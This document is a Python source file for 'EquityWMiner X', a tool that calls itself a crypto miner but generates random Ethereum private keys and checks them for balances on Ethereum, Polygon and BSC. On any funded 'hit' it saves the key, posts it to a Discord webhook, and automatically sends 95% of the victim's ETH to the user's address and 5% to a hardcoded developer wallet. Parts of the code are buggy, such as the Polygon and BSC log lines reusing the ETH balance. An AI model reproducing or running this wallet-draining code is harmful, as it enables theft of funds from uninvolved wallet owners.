import tkinter as tk
import os
import pdb
import sys
import time
import yaml
import json
import secrets
import numpy as np
import multiprocessing
from pypresence import Presence
from numba import jit, cuda
from blessed import Terminal

try:
    import psutil # Needs to be installed (pip install psutil)
except ImportError:
    input("Module 'psutil' not found/installed, to install run: 'pip install psutil' \n Press enter to exit the program")
    exit()

try:
    import requests # (pip install requests) 
except ImportError:
    input("Module 'requests' not found/installed, to install run: 'pip install requests' \n Press enter to exit the program")
    exit()

try:
    from web3 import Web3 # (pip install web3)
except ImportError:
    input("Module 'web3' not found/installed, to install run: 'pip install web3' \n Press enter to exit the program")
    exit()
try:
    from datetime import datetime # (pip install datetime)
except ImportError:
    input("Module 'datetime' not found/installed, to install run: 'pip install datetime' \n Press enter to exit the program")
    exit()
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
except ImportError:
    input("Module 'discord_webhook' not found/installed, to install run: 'pip install discord_webhook' \n Press enter to exit the program")
    exit()
starttime = datetime.now()

def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging, multibool, cudabool, useSecondary):
    t = Terminal()
    global key
    global pid
    pid = str(os.getpid())
    global w3
    if useSecondary == False: w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
    else: w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_SECONDARY"]))
    w3p = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_POLYGON"]))
    w3b = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_BSC"]))
    global w3state
    w3state = "check"
    global consERR
    consERR = 0
    if w3.is_connected():
        global i
        i=0
        while i <= 1:
            key = "0x" + secrets.token_hex(32)
            amount.value = amount.value + 1
            if int(amount.value) >= int(amounttrigger.value):
                amount.value = 0
                if (webhookurl != "null"):
                    webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
                    embed.set_timestamp()
                    embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
                    embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
                    embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                    embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                    webhook.add_embed(embed)
                    webhook.execute()
            try:
                if w3state == "main": 
                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
                    w3state = "check"
                account = w3.eth.account.from_key(key)
                bal = w3.eth.get_balance(account.address)
                global balp
                global balb
                if multibool == True:
                    if w3p.is_connected():
                        balp = w3p.eth.get_balance(account.address)
                    if w3b.is_connected():
                        balb = w3b.eth.get_balance(account.address)
                else:
                    balp = 0
                    balb = 0
                if bal > 2000000000000000 or balp > 0 or balb > 0:
                        hits.value = hits.value + 1
                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                        w3state = "main"
                        if not w3.is_connected(): w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                        print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                        print('\033[32mRecording hit in "hits.txt"...\033[0m')
                        hitstxt = open("hits.txt", "a")
                        if bal > 2000000000000000:
                            hitstxt.write("> N E W   H I T! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        if balp > 0:
                            hitstxt.write("> N E W   H I T! pKey: %s - MATIC: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        if balb > 0:
                            hitstxt.write("> N E W   H I T! pKey: %s - BNB: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        hitstxt.close()
                        if (webhookurl != "null"):
                            webhook = DiscordWebhook(url=webhookurl, description="@everyone", rate_limit_retry=True)
                            embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
                            embed.set_timestamp()
                            embed.add_embed_field(name="pKey:", value=key, inline=False)
                            embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
                            embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                            embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                            webhook.add_embed(embed)
                            webhook.execute()
                        print('\033[32mRecorded hit in "hits.txt". Attempting autowithdrawal...\033[0m')
                        if bal > 2000000000000000:
                            try:
                                gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                                gasjson = json.loads(gasdata)
                                avgGas = int(gasjson["average"])/10
                                MineTransaction = {
                                    'nonce': w3.eth.getTransactionCount(account.address),
                                    'to': str(minerAddress),
                                    'value': w3.toWei((bal*0.95-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                    'gas': 21000,
                                    'gasPrice': w3.toWei(avgGas, "gwei")
                                }
                                MineTransaction2 = {
                                    'nonce': w3.eth.getTransactionCount(account.address)+1,
                                    'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
                                    'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                    'gas': 21000,
                                    'gasPrice': w3.toWei(avgGas, "gwei")
                                    }
                                signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                                sentMineTX = w3.eth.send_raw_transaction(signedMineTX.rawTransaction)
                                print("\033[32m" + str(bal*0.95/1000000000000000000) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX))+ "\033[0m")
                                time.sleep(80)
                                signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
                                if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
                                    rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
                            except Exception as e:
                                print("\033[33m[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!\033[0m")
                                print('Logged the error in "debug.txt". Please open a new support ticket and send the debug to support team!')
                                dbug = open("debug.txt", "a")
                                dbug.write("> Got new error in withdrawal process. Line 41-91:\n%s\n\n"%e)
                                dbug.close()
                            if balp > 0:
                                print("# \x1b[35mPolygon funds were detected, but automatic withdrawal on Polygon aren't currently available\033[0m")
                            if balb > 0:
                                print("# \x1b[33Binance Smart Chain funds were detected, but automatic withdrawal on Binance Smart Chain aren't currently available \033[0m")
                else:
                    bdhits.value = bdhits.value + 1
                    if badhitlogging == True: 
                        if multibool == True:
                            print("\033[31mCHECKED | %s | BALs | %s ETH | \x1b[35m MATIC %s | \x1b[33m %s BNB |\033[31m Counter: %s\033[0m"%(str(account.address),str(bal/1000000000) ,str(balp/1000000000), str(balb/1000000000), str(bdhits.value)))
                        else: print("\033[31mCHECKED | " + str(account.address) + " | BAL | " + str(bal/1000000000) + " ETH | Counter: " + str(bdhits.value) +"\033[0m")
                    consERR = 0
                    time.sleep(0.02)
            except Exception as e:
                if badhitlogging == True: print("\033[31m[NEW ERROR] | %s | Couldn't resolve key!\033[0m"%key)
                consERR += 1
                chk.value = chk.value + 1
                if consERR > 5:
                    if consERR == 5: print("\033[13m[ERROR HANDLER - PID: %s] - Slowing down process...\033[0m"%pid)
                    time.sleep(5)
                if consERR > 15:
                    if consERR == 15: print("\033[31m[ERROR HANDLER - PID: %s] - Began process throttling...\033[0m"%pid)
                    time.sleep(30)
                if consERR > 50:
                    if consERR == 50: print("\033[31m[ERROR HANDLER - PID: %s] - Hybernating process...\033[0m"%pid)
                    time.sleep(1800)
                time.sleep(0.02)
    else:
        if useSecondary == False:
            print("\033[33mCHILD PROCESS-%s REROUTING | Connecting to secondary Web3 RPC Endpoint\033[0m"%pid)
            MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging, multibool, cudabool, True)
        else: return print("\033[31mCHILD PROCESS-%s ENDED | Process Reallocated | All connection to Web3 RPC Endpoints have expired\033[0m"%pid)


def close(reason):
    sys.exit(reason)

def rich():
    client_id = "1104920998622531606"
    RPC = Presence(client_id)

    RPC.connect()
    RPC.update(state="Mining Crypto with EquityWMiner!" ,
            large_image="equit" ,
            buttons=[{"label": "Website", "url": "https://equityminer.eu/"}, {"label": "Discord", "url": "https://discord.gg/equity-miner-community-974033944116858980"}])

def read_yaml():
    try:
        with open('config.yaml') as f:
            data = yaml.load(f, Loader=yaml.FullLoader)
            use_config = data['USE_CONFIG']

            if use_config == True:
                    return True
            else:
                    return False
    except:
        pass
def get_yaml_details():
    with open('config.yaml') as f:
        data = yaml.load(f,Loader=yaml.FullLoader)
        address = data['ADDRESS']
        bad_log = data['BAD_HIT_LOG']
        webhook = data['DISCORD_WEBHOOK']
        nividia = data['NVIDIA_CUDA']
        multichain = data['MULTICHAIN']
        intensity = data['CPU_INTENSITY']
        return address,intensity,bad_log,webhook,nividia,multichain



def button_click(message):
    label.config(text=message)

def create_button(window, text, message, close=False):
    if close:
        button = tk.Button(window, text=text, command=window.destroy)
    else:
        button = tk.Button(window, text=text, command=lambda: button_click(message))
    button.pack()

def create_window():
    window = tk.Tk()
    window.title("EquityWMiner X")

    # Create label
    global label
    label = tk.Label(window, text="Click a button!")
    label.pack()

    # Create buttons
    create_button(window, "Start Mining", "Started Miner!")
    create_button(window, "Stop Mining", "Stopped Miner!")
    create_button(window, "Exit", "Alright, See you soon!", close=True )

    window.mainloop()

# Create the window


create_window()
